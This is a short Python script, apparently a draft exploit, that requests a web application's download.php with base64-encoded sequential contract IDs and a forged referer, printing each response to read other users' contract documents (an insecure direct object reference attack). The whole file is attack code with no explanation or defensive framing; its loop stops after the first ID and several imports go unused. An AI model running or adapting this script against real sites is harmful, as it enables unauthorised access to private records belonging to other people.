#!/usr/bin/python3

from hashlib import md5
from base64 import b64encode
import requests
import re
import sys
from urllib.parse import unquote, quote


def run_exploit(base_url):
    sess = requests.session()
    sess.headers.update({'referer':base_url+'contracts.php'})
    for x in range(1, 20):
        value = b64encode(str(x).encode()).decode()
        print(base_url+"download.php?contract="+quote(value))
        content = sess.get(url=base_url+"download.php?contract="+quote(value))
        print(content.text)
        break

def main():

    base_url = sys.argv[1]
    run_exploit(base_url)


if __name__ == "__main__":
    main()
